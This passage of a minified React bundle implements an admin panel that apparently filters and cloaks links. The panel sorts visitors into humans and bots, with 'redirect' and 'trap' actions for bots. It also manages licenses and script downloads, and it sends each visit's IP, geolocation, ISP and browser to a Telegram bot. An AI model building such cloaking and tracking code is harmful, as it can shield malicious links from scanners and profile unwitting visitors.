gap-3",children:[a.jsx(W,{variant:"outline",size:"sm",onClick:()=>K(E.id,E.status),className:"bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 backdrop-blur-sm px-3 py-2 h-9",disabled:E.status==="expired",title:E.status==="active"?"Pause license":"Activate license",children:E.status==="active"?a.jsx(cu,{className:"w-4 h-4"}):a.jsx(Vm,{className:"w-4 h-4"})}),a.jsx(W,{variant:"outline",size:"sm",onClick:()=>ne(E.id),className:"bg-red-600/30 border-red-400/40 text-red-300 hover:bg-red-600/50 hover:border-red-300/60 backdrop-blur-sm px-3 py-2 h-9",title:"Delete license",children:a.jsx(ta,{className:"w-4 h-4"})})]})})]},E.id)})})]})]})]})}),a.jsxs(ir,{value:"errors",className:"space-y-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsxs(fe,{className:"relative z-10",children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"SYSTEM ERROR LOGS"}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"TELEGRAM FAILURES  ENCRYPTION ERRORS  CRITICAL SYSTEM ALERTS"})]}),a.jsxs(X,{className:"relative z-10",children:[T.length>0&&a.jsx("div",{className:"mb-4",children:a.jsx(K0,{selectedItems:T,onClearSelection:()=>M([]),onBulkDelete:Y,onBulkToggleStatus:B,itemType:"errors"})}),a.jsxs("div",{className:"mb-4 flex gap-4 text-sm font-jetbrains",children:[a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx("div",{className:"w-3 h-3 bg-red-500/30 rounded-full border border-red-400/40"}),a.jsxs("span",{className:"text-red-300",children:["Unresolved: ",s.filter(E=>!E.resolved_status).length]})]}),a.jsxs("div",{className:"flex items-center gap-2",children:[a.jsx("div",{className:"w-3 h-3 bg-green-500/30 rounded-full border border-green-400/40"}),a.jsxs("span",{className:"text-green-300",children:["Resolved: ",s.filter(E=>E.resolved_status).length]})]})]}),a.jsx("div",{className:"overflow-x-auto",children:a.jsxs("table",{className:"w-full text-sm",children:[a.jsx("thead",{children:a.jsxs("tr",{className:"border-b border-cyan-400/30",children:[a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider w-12",children:a.jsx("input",{ref:R,type:"checkbox",checked:T.length===s.length&&s.length>0,onChange:E=>ye(E.target.checked),className:"rounded border-cyan-400/30 bg-slate-700/80 text-cyan-500 focus:ring-cyan-500/50"})}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"TYPE"}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"SEVERITY"}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"MESSAGE"}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"TIMESTAMP"}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"STATUS"}),a.jsx("th",{className:"text-left p-3 text-cyan-200 font-jetbrains font-bold uppercase tracking-wider",children:"ACTIONS"})]})}),a.jsxs("tbody",{children:[s.map(E=>a.jsxs("tr",{className:`border-b border-cyan-400/10 hover:bg-cyan-500/5 transition-colors ${T.includes(E.id)?"bg-cyan-500/10":""}`,children:[a.jsx("td",{className:"p-3",children:a.jsx("input",{type:"checkbox",checked:T.includes(E.id),onChange:U=>{U.stopPropagation(),he(E.id,U.target.checked)},className:"rounded border-cyan-400/30 bg-slate-700/80 text-cyan-500 focus:ring-cyan-500/50"})}),a.jsx("td",{className:"p-3",children:a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${ge(E.error_type)} border backdrop-blur-sm`,children:E.error_type.replace("_"," ")})}),a.jsx("td",{className:"p-3",children:a.jsx("span",{className:`px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider ${Ye(E.severity)} border backdrop-blur-sm`,children:E.severity})}),a.jsxs("td",{className:"p-3 text-cyan-300 font-jetbrains max-w-md",children:[a.jsx("div",{className:"truncate",title:E.error_message,children:E.error_message}),E.error_details&&a.jsxs("div",{className:"text-xs text-cyan-400/60 mt-1",children:[JSON.stringify(E.error_details).slice(0,100),"..."]})]}),a.jsx("td",{className:"p-3 text-cyan-300 font-jetbrains text-xs",children:new Date(E.created_at).toLocaleString()}),a.jsx("td",{className:"p-3",children:a.jsx("div",{className:"flex items-center gap-2",children:E.resolved_status?a.jsxs("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-green-500/20 text-green-300 border border-green-400/30 backdrop-blur-sm",children:[a.jsx(ba,{className:"w-3 h-3 inline mr-1"}),"RESOLVED"]}):a.jsxs("span",{className:"px-2 py-1 rounded-full text-xs font-jetbrains font-bold uppercase tracking-wider bg-red-500/20 text-red-300 border border-red-400/30 backdrop-blur-sm",children:[a.jsx(ct,{className:"w-3 h-3 inline mr-1"}),"ACTIVE"]})})}),a.jsx("td",{className:"p-3",children:!E.resolved_status&&a.jsxs(W,{variant:"outline",size:"sm",onClick:()=>_e(E.id),className:"bg-green-600/30 border-green-400/40 text-green-300 hover:bg-green-600/50 hover:border-green-300/60 backdrop-blur-sm",children:[a.jsx(ba,{className:"w-3 h-3 mr-1"}),"RESOLVE"]})})]},E.id)),s.length===0&&a.jsx("tr",{children:a.jsx("td",{colSpan:7,className:"p-8 text-center text-cyan-300/60 font-jetbrains",children:"NO SYSTEM ERRORS DETECTED"})})]})]})})]})]}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-purple-900/50 to-violet-900/60 border border-purple-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-purple-400/3 via-violet-500/3 to-indigo-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-purple-400/30 to-transparent"}),a.jsxs(fe,{className:"relative z-10",children:[a.jsx(me,{className:"bg-gradient-to-r from-purple-200 via-violet-200 to-indigo-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"BLOCKED URLS STATISTICS"}),a.jsx(bt,{className:"text-purple-300/80 font-jetbrains tracking-wide",children:"DEAD URL ATTEMPTS  CACHE MANAGEMENT  REQUEST PATTERNS"})]}),a.jsx(X,{className:"relative z-10",children:a.jsx(lC,{})})]})]}),a.jsx(ir,{value:"health",children:a.jsxs("div",{className:"space-y-6",children:[a.jsx(rC,{}),a.jsx(tC,{}),a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsxs(fe,{className:"relative z-10",children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"DATABASE MAINTENANCE"}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"AUTOMATED CLEANUP  DATA OPTIMIZATION  SYSTEM MAINTENANCE"})]}),a.jsxs(X,{className:"relative z-10 space-y-6",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4",children:[a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-500 rounded-xl opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:z,disabled:o,className:"relative z-10 w-full h-16 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-500 hover:to-blue-500 text-white font-jetbrains font-bold uppercase tracking-wider border-0 shadow-lg flex flex-col items-center justify-center",children:[a.jsx(Rt,{className:"w-6 h-6 mb-1"}),"COMPREHENSIVE PURGE"]})]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-yellow-500 to-orange-500 rounded-xl opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:P,variant:"outline",className:"relative z-10 w-full h-16 bg-slate-800/80 border-yellow-400/40 text-yellow-200 hover:bg-slate-700/80 hover:border-yellow-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm flex flex-col items-center justify-center",children:[a.jsx(ta,{className:"w-5 h-5 mb-1"}),"PURGE EXPIRED"]})]}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-1 bg-gradient-to-r from-red-500 to-pink-500 rounded-xl opacity-60 blur group-hover:opacity-100 transition duration-300"}),a.jsxs(W,{onClick:Q,variant:"outline",className:"relative z-10 w-full h-16 bg-slate-800/80 border-red-400/40 text-red-200 hover:bg-slate-700/80 hover:border-red-300/60 font-jetbrains font-bold uppercase tracking-wider backdrop-blur-sm flex flex-col items-center justify-center",children:[a.jsx(ct,{className:"w-5 h-5 mb-1"}),"CLEAN INACTIVE"]})]})]}),a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("h4",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-sm mb-3",children:"COMPREHENSIVE PURGE TARGETS"}),a.jsxs("ul",{className:"space-y-2 text-cyan-300/80 text-sm font-jetbrains",children:[a.jsx("li",{children:" Expired licenses (older than 30 days)"}),a.jsx("li",{children:" Old user sessions (older than 7 days)"}),a.jsx("li",{children:" Outdated visit statistics (older than 30 days)"}),a.jsx("li",{children:" Orphaned session records"}),a.jsx("li",{children:" Deactivated URL entries"})]})]}),a.jsxs("div",{className:"p-4 bg-slate-700/30 rounded-lg border border-cyan-400/20 backdrop-blur-sm",children:[a.jsx("h4",{className:"text-cyan-200 font-jetbrains font-bold uppercase tracking-wider text-sm mb-3",children:"SECURITY BENEFITS"}),a.jsxs("ul",{className:"space-y-2 text-cyan-300/80 text-sm font-jetbrains",children:[a.jsx("li",{children:" Prevents database bloat"}),a.jsx("li",{children:" Removes inactive user data"}),a.jsx("li",{children:" Ensures URL security compliance"}),a.jsx("li",{children:" Optimizes query performance"}),a.jsx("li",{children:" Maintains data integrity"})]})]})]}),a.jsxs("div",{className:"p-4 bg-gradient-to-r from-yellow-500/10 to-orange-500/10 rounded-lg border border-yellow-400/30 backdrop-blur-sm",children:[a.jsxs("div",{className:"flex items-center gap-3 mb-2",children:[a.jsx(ct,{className:"w-5 h-5 text-yellow-300"}),a.jsx("h4",{className:"text-yellow-200 font-jetbrains font-bold uppercase tracking-wider text-sm",children:"AUTOMATED CLEANUP ACTIVE"})]}),a.jsx("p",{className:"text-yellow-300/80 text-sm font-jetbrains leading-relaxed",children:"The system automatically performs expired license cleanup every 5 minutes and refreshes health data every 3 minutes. Manual cleanup operations ensure optimal database performance and security compliance."})]})]})]})]})}),a.jsx(ir,{value:"performance",children:a.jsxs("div",{className:"space-y-6",children:[a.jsx(uC,{}),a.jsx(hC,{}),a.jsx(pC,{})]})}),a.jsx(ir,{value:"files",children:a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-800/80 via-blue-900/50 to-indigo-900/60 border border-cyan-400/30 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/3 via-blue-500/3 to-purple-500/3"}),a.jsx("div",{className:"absolute top-0 left-0 w-full h-px bg-gradient-to-r from-transparent via-cyan-400/30 to-transparent"}),a.jsxs(fe,{className:"relative z-10",children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"FILE MANAGEMENT SYSTEM"}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"UPLOAD AND MANAGE SCRIPT DOWNLOADS FOR USERS"})]}),a.jsx(X,{className:"relative z-10",children:a.jsx(dC,{})})]})})]})]})]})},vC=()=>a.jsx(xC,{children:(t,e)=>a.jsx(yC,{initialData:t,onLogout:e})});class bC{constructor(){re(this,"config",null);re(this,"visitCount",0);re(this,"todayVisits",0)}setConfig(e,r){this.config={botToken:e,chatId:r}}loadConfig(){}async getLocationData(e,r){if(r)return console.log(" Using AlienAPI location data:",r),{location:`${r.country_name}`,country:r.country_name,countryCode:r.country_code,isp:r.isp};try{console.log(" Fetching location data from fallback API for IP:",e);const s=await(await fetch(`https://ipapi.co/${e}/json/`)).json();return console.log(" Fallback API response:",s),{location:`${s.city||"Unknown"}, ${s.country_name||"Unknown"}`,country:s.country_name,countryCode:s.country,isp:s.org}}catch(n){return console.error(" Location API failed:",n),{location:"Unknown",country:"Unknown",countryCode:"XX",isp:"Unknown"}}}getCountryFlag(e){if(!e||e.length!==2)return"";const n=e.toUpperCase().split("").map(s=>127397+s.charCodeAt(0));return String.fromCodePoint(...n)}updateVisitCounts(){const e=parseInt(localStorage.getItem("total_visits")||"0")+1;localStorage.setItem("total_visits",e.toString()),this.visitCount=e;const r=new Date().toDateString();localStorage.getItem("last_visit_date")===r?this.todayVisits=parseInt(localStorage.getItem("today_visits")||"0")+1:(this.todayVisits=1,localStorage.setItem("last_visit_date",r)),localStorage.setItem("today_visits",this.todayVisits.toString())}getBrowserInfo(e){console.log(" Detecting browser for User-Agent:",e);const r=[{name:"Edge",pattern:/\b(?:Edg|Edge|EdgA|EdgiOS|EdgeHTML)\b/i,versionPattern:/\b(?:Edg|Edge|EdgA|EdgiOS|EdgeHTML)\/([\d.]+)/i,icon:""},{name:"Opera",pattern:/\b(?:OPR|Opera|OPiOS)\b/i,versionPattern:/\b(?:OPR|Opera|OPiOS)\/([\d.]+)/i,icon:""},{name:"Firefox",pattern:/\b(?:Firefox|FxiOS)\b/i,versionPattern:/\b(?:Firefox|FxiOS)\/([\d.]+)/i,icon:""},{name:"Safari",pattern:/\bSafari\b/i,versionPattern:/\bVersion\/([\d.]+)/i,icon:"",exclude:/\b(?:Chrome|Chromium|Edg|Edge|OPR|Opera)\b/i},{name:"Chrome",pattern:/\b(?:Chrome|Chromium)\b/i,versionPattern:/\b(?:Chrome|Chromium)\/([\d.]+)/i,icon:"",exclude:/\b(?:Edg|Edge|EdgA|EdgiOS|EdgeHTML|OPR|Opera|OPiOS)\b/i},{name:"Internet Explorer",pattern:/\b(?:MSIE|Trident)\b/i,versionPattern:/\b(?:MSIE ([\d.]+)|rv:([\d.]+))\b/i,icon:""}];for(const n of r)if(n.pattern.test(e)){if(n.exclude&&n.exclude.test(e)){console.log(` ${n.name} pattern matched but excluded due to: ${n.exclude}`);continue}const s=e.match(n.versionPattern),i=s&&(s[1]||s[2])||"Unknown",o=`${n.icon} ${n.name} ${i}`;return console.log(` Browser detected: ${o}`),o}return console.log(" Unknown browser detected")," Unknown Browser"}formatHumanMessage(e){const r=this.getCountryFlag(e.countryCode||""),n=e.timestamp.toISOString().replace("T"," ").slice(0,19)+" UTC";return` REAL HUMAN VISIT

 Status: Successfully processed
 IP: ${e.ip}
${r} Location: ${e.location||"Unknown"}
 ISP: ${e.isp||"Unknown"}
${e.browserInfo||" Unknown Browser"}
 Visit #${e.visitCount} | Today: ${e.todayVisits} visits
 Time: ${n}
`}formatBotMessage(e){const r=this.getCountryFlag(e.countryCode||""),n=e.timestamp.toISOString().replace("T"," ").slice(0,19)+" UTC",s=e.confidence??0,i=e.action||"unknown",o={redirect:"",trap:"",monitor:"",allow:""}[i]||"",l=s>=80?"":s>=60?"":"";return` BOT DETECTED & PROCESSED

${o} Action: ${i.toUpperCase()}
${l} Confidence: ${s}% (Local: ${e.localScore||0}% | AlienAPI: ${e.alienScore||0}%)
 Behavior Score: ${e.behaviorScore||0}%
 IP: ${e.ip}
${r} Location: ${e.location||"Unknown"}
 ISP: ${e.isp||"Unknown"}
${e.browserInfo||" Unknown Browser"}
 User-Agent: ${e.userAgent.slice(0,80)}${e.userAgent.length>80?"...":""}
 Time: ${n}
`}getNotificationSettings(){return{humanVisits:!0,botDetections:!0}}setNotificationSettings(e){}async sendNotification(e){const{supabase:r}=await Vt(async()=>{const{supabase:o}=await Promise.resolve().then(()=>$3);return{supabase:o}},void 0),n=this.getNotificationSettings(),s=e.isBot||!1;if(s&&!n.botDetections){console.log("Bot detection notification disabled, skipping");return}if(!s&&!n.humanVisits){console.log("Human visit notification disabled, skipping");return}const i=localStorage.getItem("license_session_token");if(!i)throw console.error(" CRITICAL: No session token found, cannot send Telegram notification"),new Error("No session token found for Telegram notification");try{console.log(" Sending Telegram notification for:",e),this.updateVisitCounts();const o=await this.getLocationData(e.ip||"",e.locationData);console.log("Location data retrieved:",o);const{data:l,error:c}=await r.functions.invoke("telegram-notify",{body:{ip:e.ip||"Unknown",userAgent:e.userAgent||"Unknown",isBot:e.isBot||!1,confidence:e.confidence,action:e.action,behaviorScore:e.behaviorScore,localScore:e.localScore,alienScore:e.alienScore,sessionToken:i,locationData:{country_name:o.country,country_code:o.countryCode,isp:o.isp,hostname:o.isp,ip:e.ip}}});if(c)throw console.error(" Telegram notification Edge Function error:",c),await r.rpc("log_system_error_enhanced",{error_type_input:"telegram",error_message_input:`Telegram notification failed: ${c.message}`,error_details_input:{error:c.message,visitData:JSON.stringify(e)},user_session_token_input:i,severity_input:"error",skip_if_configuration:!0}),new Error(`Telegram notification failed: ${c.message}`);console.log(" Telegram notification sent successfully via Edge Function!")}catch(o){throw console.error("Failed to send Telegram notification:",o),await r.rpc("log_system_error_enhanced",{error_type_input:"telegram",error_message_input:`Telegram notification failed: ${o.message}`,error_details_input:{error:o.message,visitData:JSON.stringify(e)},user_session_token_input:i,severity_input:"error",skip_if_configuration:!0}),o}}clearConfig(){this.config=null}isConfigured(){var e,r;return!!((e=this.config)!=null&&e.botToken&&((r=this.config)!=null&&r.chatId))}}const Fn=new bC,wC=()=>{const[t,e]=p.useState(""),[r,n]=p.useState(""),[s,i]=p.useState(!1),[o,l]=p.useState(!1),[c,d]=p.useState(!1),[u,h]=p.useState(!1),[f,m]=p.useState({humanVisits:!0,botDetections:!0}),{toast:g}=Ln();p.useEffect(()=>{v()},[]);const v=async()=>{try{const j=localStorage.getItem("license_session_token");if(!j){console.log("No session token found");return}const{data:_,error:N}=await $.rpc("get_user_telegram_config",{session_token_input:j});if(N){console.error("Failed to load telegram config:",N),await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Failed to load Telegram configuration: ${N.message}`,error_details_input:{error:N.message,code:N.code},user_session_token_input:j,severity_input:"error"}),g({title:"Configuration Error",description:"Failed to load Telegram configuration from database",variant:"destructive"});return}if(_&&_.length>0){const S=_[0];i(!0);const k=S.notification_settings||{humanVisits:!0,botDetections:!0};m(k),Fn.setConfig(S.bot_token,S.chat_id),Fn.setNotificationSettings(k),console.log("Loaded configuration from database")}else i(!1),console.log("No Telegram configuration found in database")}catch(j){console.error("Error loading configuration:",j);const _=localStorage.getItem("license_session_token");_&&await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Unexpected error loading Telegram configuration: ${j.message}`,error_details_input:{error:j.message},user_session_token_input:_,severity_input:"error"}),g({title:"Configuration Error",description:"Unexpected error loading Telegram configuration",variant:"destructive"})}},w=async()=>{if(!t.trim()||!r.trim()){g({title:"Missing Information",description:"Please enter both bot token and chat ID",variant:"destructive"});return}l(!0);try{const j=localStorage.getItem("license_session_token");if(!j){g({title:"Session Error",description:"No active session found. Please login again.",variant:"destructive"});return}const{error:_}=await $.rpc("upsert_user_telegram_config",{session_token_input:j,bot_token_input:t.trim(),chat_id_input:r.trim(),notification_settings_input:f});if(_){console.error("Database save error:",_),await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Failed to save Telegram configuration: ${_.message}`,error_details_input:{error:_.message,code:_.code},user_session_token_input:j,severity_input:"error"}),g({title:"Configuration Save Failed",description:"Failed to save Telegram configuration to database",variant:"destructive"});return}Fn.setConfig(t.trim(),r.trim()),Fn.setNotificationSettings(f),i(!0),e(""),n(""),g({title:"Success",description:"Telegram notifications configured successfully"})}catch(j){console.error("Save error:",j);const _=localStorage.getItem("license_session_token");_&&await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Unexpected error saving Telegram configuration: ${j.message}`,error_details_input:{error:j.message},user_session_token_input:_,severity_input:"error"}),g({title:"Configuration Save Failed",description:"Unexpected error saving Telegram configuration",variant:"destructive"})}finally{l(!1)}},y=async()=>{if(!s){g({title:"Not Configured",description:"Please configure Telegram first",variant:"destructive"});return}d(!0);try{await Fn.sendNotification({ip:"127.0.0.1",userAgent:"Test Browser - Manual Test",isBot:!1}),g({title:"Test Sent",description:"Check your Telegram for the test message"})}catch(j){console.error("Test notification error:",j);const _=localStorage.getItem("license_session_token");_&&await $.rpc("log_system_error",{error_type_input:"telegram_send",error_message_input:`Test notification failed: ${j.message}`,error_details_input:{error:j.message},user_session_token_input:_,severity_input:"error"}),g({title:"Test Notification Failed",description:"Could not send test message - check admin panel for details",variant:"destructive"})}finally{d(!1)}},x=async()=>{try{const j=localStorage.getItem("license_session_token");if(j){const{error:_}=await $.rpc("delete_user_telegram_config",{session_token_input:j});_&&(console.error("Failed to clear database config:",_),await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Failed to clear Telegram configuration: ${_.message}`,error_details_input:{error:_.message,code:_.code},user_session_token_input:j,severity_input:"error"}))}e(""),n(""),i(!1),Fn.clearConfig(),g({title:"Cleared",description:"Telegram configuration has been reset"})}catch(j){console.error("Error clearing config:",j);const _=localStorage.getItem("license_session_token");_&&await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Unexpected error clearing Telegram configuration: ${j.message}`,error_details_input:{error:j.message},user_session_token_input:_,severity_input:"error"}),g({title:"Clear Configuration Failed",description:"Unexpected error clearing Telegram configuration",variant:"destructive"})}},b=async(j,_)=>{const N={...f,[j]:_};m(N);try{const S=localStorage.getItem("license_session_token");if(S){const{error:k}=await $.rpc("update_user_notification_settings",{session_token_input:S,notification_settings_input:N});k&&(console.error("Failed to update notification settings in database:",k),await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Failed to update notification settings: ${k.message}`,error_details_input:{error:k.message,code:k.code},user_session_token_input:S,severity_input:"error"}))}Fn.setNotificationSettings(N),g({title:`${_?"Enabled":"Disabled"}`,description:`${j==="humanVisits"?"Human visit":"Bot detection"} notifications ${_?"enabled":"disabled"}`})}catch(S){console.error("Error updating notification settings:",S);const k=localStorage.getItem("license_session_token");k&&await $.rpc("log_system_error",{error_type_input:"telegram_config",error_message_input:`Unexpected error updating notification settings: ${S.message}`,error_details_input:{error:S.message},user_session_token_input:k,severity_input:"error"}),g({title:"Settings Update Failed",description:"Unexpected error updating notification settings",variant:"destructive"})}};return a.jsx("div",{className:"space-y-6 sm:space-y-8",children:s?a.jsxs("div",{className:"space-y-4 sm:space-y-6",children:[a.jsx("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-green-500/40 rounded-xl p-4 sm:p-6 shadow-xl shadow-green-500/10 touch-manipulation",children:a.jsxs("div",{className:"flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 sm:gap-6",children:[a.jsxs("div",{className:"flex-1 min-w-0",children:[a.jsxs("div",{className:"flex items-center gap-2 sm:gap-3 mb-2",children:[a.jsxs("div",{className:"relative",children:[a.jsx("div",{className:"absolute inset-0 bg-green-400/30 rounded-full blur-sm animate-pulse"}),a.jsx(Ti,{className:"relative z-10 h-4 w-4 sm:h-5 sm:w-5 text-green-400"})]}),a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-green-300 tracking-wide",children:"Active Configuration"})]}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-green-400/80 leading-relaxed",children:"Telegram notifications are configured and operational"})]}),a.jsxs("div",{className:"flex flex-col sm:flex-row gap-2 sm:gap-3 w-full sm:w-auto",children:[a.jsx(W,{variant:"outline",size:"sm",onClick:x,className:"border-red-500/40 text-red-300 hover:text-red-200 hover:bg-red-500/20 bg-slate-800/50 backdrop-blur-sm font-inter font-medium min-h-[44px] px-4 touch-manipulation transition-all duration-300",children:"Disconnect"}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-green-500 to-blue-500 rounded-lg opacity-60 blur group-hover:opacity-90 transition duration-300"}),a.jsx(W,{size:"sm",onClick:y,disabled:c,className:"relative z-10 bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-500 hover:to-blue-500 text-white font-inter font-semibold min-h-[44px] px-4 touch-manipulation shadow-lg transition-all duration-300",children:c?a.jsxs("span",{className:"flex items-center gap-2",children:[a.jsx("div",{className:"w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"}),"Testing..."]}):a.jsxs(a.Fragment,{children:[a.jsx(t_,{className:"mr-2 h-4 w-4"}),"Send Test"]})})]})]})]})}),a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 shadow-xl shadow-blue-500/10 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-4 sm:mb-6 tracking-wide",children:"Notification Preferences"}),a.jsxs("div",{className:"space-y-3 sm:space-y-4",children:[a.jsxs("div",{className:"flex items-start sm:items-center justify-between p-3 sm:p-4 bg-slate-700/40 backdrop-blur-sm rounded-lg border border-blue-500/20 gap-4 touch-manipulation transition-all duration-200 hover:bg-slate-700/60",children:[a.jsxs("div",{className:"flex-1 min-w-0",children:[a.jsx("h4",{className:"font-inter font-medium text-blue-200 text-sm sm:text-base leading-tight",children:"Human Visits"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Alert when real users access your links"})]}),a.jsx("button",{onClick:()=>b("humanVisits",!f.humanVisits),className:`relative inline-flex h-6 w-11 sm:h-7 sm:w-13 items-center rounded-full transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-blue-400/50 focus:ring-offset-2 focus:ring-offset-slate-800 flex-shrink-0 min-h-[44px] min-w-[44px] touch-manipulation ${f.humanVisits?"bg-gradient-to-r from-blue-500 to-purple-500 shadow-lg shadow-blue-500/30":"bg-slate-600 hover:bg-slate-500"}`,style:{minHeight:"44px",minWidth:"44px",display:"flex",alignItems:"center",justifyContent:"center"},children:a.jsx("span",{className:`inline-block h-4 w-4 sm:h-5 sm:w-5 transform rounded-full bg-white shadow-lg transition-transform duration-300 ${f.humanVisits?"translate-x-6 sm:translate-x-7":"translate-x-1"}`})})]}),a.jsxs("div",{className:"flex items-start sm:items-center justify-between p-3 sm:p-4 bg-slate-700/40 backdrop-blur-sm rounded-lg border border-blue-500/20 gap-4 touch-manipulation transition-all duration-200 hover:bg-slate-700/60",children:[a.jsxs("div",{className:"flex-1 min-w-0",children:[a.jsx("h4",{className:"font-inter font-medium text-blue-200 text-sm sm:text-base leading-tight",children:"Bot Detection"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Alert when automated traffic is detected"})]}),a.jsx("button",{onClick:()=>b("botDetections",!f.botDetections),className:`relative inline-flex h-6 w-11 sm:h-7 sm:w-13 items-center rounded-full transition-all duration-300 focus:outline-none focus:ring-2 focus:ring-blue-400/50 focus:ring-offset-2 focus:ring-offset-slate-800 flex-shrink-0 min-h-[44px] min-w-[44px] touch-manipulation ${f.botDetections?"bg-gradient-to-r from-blue-500 to-purple-500 shadow-lg shadow-blue-500/30":"bg-slate-600 hover:bg-slate-500"}`,style:{minHeight:"44px",minWidth:"44px",display:"flex",alignItems:"center",justifyContent:"center"},children:a.jsx("span",{className:`inline-block h-4 w-4 sm:h-5 sm:w-5 transform rounded-full bg-white shadow-lg transition-transform duration-300 ${f.botDetections?"translate-x-6 sm:translate-x-7":"translate-x-1"}`})})]})]})]})]}):a.jsx("div",{className:"space-y-4 sm:space-y-6",children:a.jsxs("div",{className:"bg-slate-800/40 backdrop-blur-sm border border-blue-500/30 rounded-xl p-4 sm:p-6 shadow-xl shadow-blue-500/10 touch-manipulation",children:[a.jsx("h3",{className:"font-jetbrains text-base sm:text-lg font-semibold text-blue-200 mb-4 sm:mb-6 tracking-wide",children:"Bot Authentication"}),a.jsxs("div",{className:"space-y-4 sm:space-y-5",children:[a.jsxs("div",{className:"space-y-2 sm:space-y-3",children:[a.jsx(Ht,{htmlFor:"botToken",className:"font-inter text-sm font-medium text-blue-300 tracking-wide",children:"Bot Token"}),a.jsxs("div",{className:"relative group",children:[a.jsx("div",{className:"absolute -inset-0.5 bg-gradient-to-r from-blue-500/20 to-purple-500/20 rounded-lg opacity-0 group-focus-within:opacity-100 transition duration-300 blur-sm"}),a.jsx(Ze,{id:"botToken",type:u?"text":"password",placeholder:"Enter your Telegram bot 